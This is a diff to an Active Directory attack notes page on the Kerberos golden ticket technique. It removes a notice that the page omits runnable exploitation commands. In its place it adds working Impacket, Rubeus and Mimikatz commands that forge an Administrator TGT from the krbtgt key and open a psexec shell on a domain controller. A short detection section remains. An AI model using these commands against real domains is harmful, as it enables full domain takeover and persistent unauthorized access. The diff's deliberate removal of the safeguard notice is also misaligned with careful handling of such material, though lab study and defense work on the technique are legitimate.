@@ -10,16 +10,33 @@ mitre: "T1558.001"
 tag: null
 ---
 
+
 # Golden ticket
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **`krbtgt` account** key (NT hash or AES).
 
-## Detection
+### Concept (deep)
+Forge a **TGT** with the `krbtgt` key: any user, any group, any lifetime. Survives resets of other accounts; only a **double krbtgt reset** invalidates it.
+
+### Exhaustive commands
+```bash
+# ── Impacket ticketer ────────────────────────────────────────────────
+impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-X \
+  -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
+
+# ── Rubeus (AES256 preferred) ────────────────────────────────────────
+Rubeus.exe golden /aes256:<key> /user:Administrator \
+  /domain:corp.local /sid:S-1-5-21-X /ptt
+
+# ── Mimikatz ─────────────────────────────────────────────────────────
+kerberos::golden /user:Administrator /domain:corp.local \
+  /sid:S-1-5-21-X /krbtgt:<hash> /ptt
+```
+
+### Detection
 **4769 without 4768**; TGT lifetime > domain policy; `krbtgt` password age anomaly; rotate **twice**.
 
 ---
